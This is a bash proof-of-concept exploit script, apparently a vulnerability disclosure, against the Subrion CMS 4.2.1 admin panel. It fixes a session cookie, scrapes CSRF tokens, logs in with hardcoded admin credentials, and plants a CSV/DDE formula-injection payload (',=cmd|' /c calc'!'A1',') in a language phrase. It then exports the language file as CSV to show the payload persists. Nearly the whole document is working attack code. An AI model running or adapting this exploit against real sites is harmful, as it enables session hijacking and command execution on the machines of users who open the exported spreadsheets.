#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"

# Grep Session Cookie Name
sess_cookie_name=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*")
cookies="Cookie: loader=loaded; $sess_cookie_name=00000000000000000000000000"
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
echo "[*] Logging in"
# Fix the Session Cookie Value and login
res=$(curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "$cookies" -i | grep "Set-Cookie")

echo "[*] Adding evil phrase"
# Get CSRF Token to ADD a phrase
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/phrases/add/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Add the crafted parameter
res=$(curl -ksi -x "$proxy" -X "POST" -H "$cookies" --data-binary "__st=$csrf_token&key=_csv_injection_&category=common&module=&value%5Ben%5D=%2C%3Dcmd%7C%27+%2Fc+calc%27%21%27A1%27%2C&save=1&goto=list"  "$target/phrases/add/")
if [[ $(echo $res | grep "HTTP/1.1" | grep 302) == "" ]]; then
	echo "Could not add the evil phrase"
	exit 1
fi
echo "[*] Downloading Language"
# Get CSRF Token to Download
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/languages/download/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Downloading the file, showing the issue
curl -ks -x $proxy -X "POST" -H "$cookies" --data-binary "__st=$csrf_token&lang=en&file_format=csv&filename=subrion_4.2.1_en" "$target/languages/download/" | grep "_csv_injection_"
